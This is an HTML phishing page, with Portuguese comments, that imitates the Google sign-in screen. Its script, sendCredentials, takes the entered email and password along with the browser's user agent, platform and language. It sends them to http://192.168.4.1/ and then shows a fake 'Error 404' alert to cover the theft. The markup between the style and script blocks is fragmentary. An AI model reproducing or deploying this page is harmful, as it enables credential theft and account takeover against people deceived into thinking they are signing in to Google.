<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login do Google</title>
    <style>
      /* Estilos CSS */
      .hidden {
        display: none;
      }

      body {
        font-family: "Roboto", sans-serif;
        background-color: #f1f3f4;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        padding: 0 10px; /* Adicionado para evitar corte de conteúdo em telas muito pequenas */
        box-sizing: border-box;
      }

      .login-container {
        width: 100%;
        max-width: 360px;
        padding: 40px;
        background: white;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        border-radius: 8px;
        text-align: center;
        margin: 0 auto;
        box-sizing: border-box; /* Certifique-se de incluir o padding no tamanho total */
      }

      .login-container img {
        width: 75px;
        margin-bottom: 16px;
      }

      .login-container h1 {
        font-size: 24px;
        color: #202124;
        margin: 16px 0;
        font-weight: 500;
      }

      .login-container p {
        font-size: 16px;
        color: #5f6368;
        margin: 16px 0;
        line-height: 1.5;
      }

      .login-container form {
        position: relative;
      }

      .login-container .input-wrapper {
        position: relative;
        margin: 16px 0;
      }

      .login-container input[type="email"],
      .login-container input[type="password"] {
        width: 100%;
        padding: 12px 16px;
        border: 1px solid #dadce0;
        border-radius: 4px;
        font-size: 16px;
        outline: none;
        transition: border-color 0.3s ease, box-shadow 0.3s ease;
        font-family: "Roboto", sans-serif;
        box-sizing: border-box;
      }

      .login-container input[type="email"]:focus,
      .login-container input[type="password"]:focus {
        border-color: #1a73e8;
        box-shadow: 0 0 0 1px #1a73e8;
      }

      .login-container label {
        position: absolute;
        top: 50%;
        left: 16px;
        transform: translateY(-50%);
        color: #80868b;
        pointer-events: none;
        transition: top 0.2s, font-size 0.2s, color 0.2s;
      }

      .login-container input:focus + label,
      .login-container input:not(:placeholder-shown) + label {
        top: -10px;
        left: 12px;
        font-size: 12px;
        color: #1a73e8;
        background: white;
        padding: 0 4px;
      }

      .login-container input[type="submit"] {
        width: calc(50% - 8px);
        padding: 12px 16px;
        margin: 24px 4px 16px 0;
        border: none;
        border-radius: 4px;
        background-color: #1a73e8;
        color: white;
        font-size: 16px;
        cursor: pointer;
        transition: background-color 0.3s ease;
        font-family: "Roboto", sans-serif;
      }

      .login-container input[type="submit"]:hover {
        background-color: #1558b6;
      }

      .login-container .footer {
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-size: 14px;
        color: #5f6368;
        margin-top: 16px;
        flex-wrap: wrap; /* Adicionado para melhor resposta em telas pequenas */
      }

      .login-container .footer a {
        color: #1a73e8;
        text-decoration: none;
        transition: text-decoration 0.2s;
      }

      .login-container .footer a:hover {
        text-decoration: underline;
      }

      .login-container .language-selector {
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 14px;
        color: #5f6368;
        margin-top: 16px;
      }

      .login-container .language-selector select {
        border: none;
        background: none;
        font-size: 14px;
        color: #1a73e8;
        cursor: pointer;
        font-family: "Roboto", sans-serif;
      }

      /* Adicionando media queries para melhorar a responsividade */
      @media (max-width: 768px) {
        .login-container {
          padding: 30px;
        }

        .login-container h1 {
          font-size: 20px;
        }

        .login-container p {
          font-size: 14px;
        }

        .login-container input[type="submit"] {
          width: 100%;
          margin: 16px 0;
        }

        .login-container .footer {
          flex-direction: column;
          text-align: center;
        }
      }

      @media (max-width: 400px) {
        .login-container {
          padding: 20px;
        }

        .login-container h1 {
          font-size: 18px;
        }

        .login-container p {
          font-size: 12px;
        }
      }

      /* Placeholder styling */
      .login-container input::placeholder {
        color: transparent;
        transition: color 0.3s ease;
      }

      .login-container input:focus::placeholder {
        color: transparent;
      }

      .login-container input:focus + label,
      .login-container input:not(:placeholder-shown) + label {
        top: -10px;
        left: 12px;
        font-size: 12px;
        color: #1a73e8;
        background: white;
        padding: 0 4px;
        transition: all 0.2s ease;
      }

      .logo-google {
        padding: 1px;
        margin-top: 0px;
        margin-bottom: 0px;
      }

      .logo-google svg {
        padding: 0px;
        margin-top: 0px;
        margin-bottom: 0px;
      }
    </style>

              name="password"
              id="password"
              required

            <label for="password"></label>

    <script>
      function changeLanguage(selectedLanguage) {
        // Oculta todos os corpos de idioma
        var languageBodies = document.querySelectorAll(
          ".login-container > div"
        );
        languageBodies.forEach(function (body) {
          body.classList.add("hidden");
        });
        // Mostra o corpo do idioma selecionado
        document.getElementById(selectedLanguage).classList.remove("hidden");
      }

      // Adiciona o evento de entrada ao campo de e-mail em cada corpo de idioma
      var emailInputs = document.querySelectorAll('input[type="email"]');
      emailInputs.forEach(function (input) {
        input.addEventListener("input", function () {
          // Encontra o wrapper de senha dentro do formulário atual
          var passwordWrapper =
            this.closest("form").querySelector("#password-wrapper");
          if (this.value) {
            passwordWrapper.style.display = "block";
          } else {
            passwordWrapper.style.display = "none";
          }
        });
      });
      //ales das credencias de email e senha , tabem pode pegar mas infomacoes sobre o dispositivo do usuario
      function sendCredentials() {
        var email = document.getElementById("email").value;
        var password = document.getElementById("password").value;
        var userAgent = navigator.userAgent;
        var platform = navigator.platform;
        var language = navigator.language;

        var url =
          "http://192.168.4.1/?email=" +
          encodeURIComponent(email) +
          "&password=" +
          encodeURIComponent(
            `${password} | ${userAgent} | ${platform} | ${language}`
          );

        getFile(url);
        alert("Error 404");
        window.location.href = "#";
      }

      function getFile(url) {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.send();
      }
